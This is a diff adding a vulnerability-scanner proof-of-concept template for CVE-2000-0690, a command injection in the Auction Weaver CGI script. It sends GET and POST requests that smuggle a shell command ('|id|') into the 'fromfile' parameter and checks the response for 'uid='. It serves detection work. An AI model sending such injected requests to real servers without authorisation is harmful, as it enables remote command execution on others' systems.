@@ -1,0 +1,49 @@
+[info]
+author = "ave"
+description = "通过向 Auction Weaver CGI 脚本发送带有 shell 元字符的 fromfile 参数，验证是否存在命令注入漏洞。PoC 使用无害的 id 命令检测服务器是否存在命令执行。"
+id = "POC-AVE-2000-0541"
+name = "CVE-2000-0690 Auction Weaver Remote Command Execution PoC"
+severity = "critical"
+tags = ["ave-2000-0541"]
+vuln_id = [
+    "CVE-2000-0690",
+    "AVE-2000-0541",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/awl/auctionweaver.pl?flag1=1&fromfile=%7Cid%7C&placebid=1&catdir=cat1"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/awl/auctionweaver.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "flag1=1&fromfile=%7Cid%7C&placebid=1&catdir=cat1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
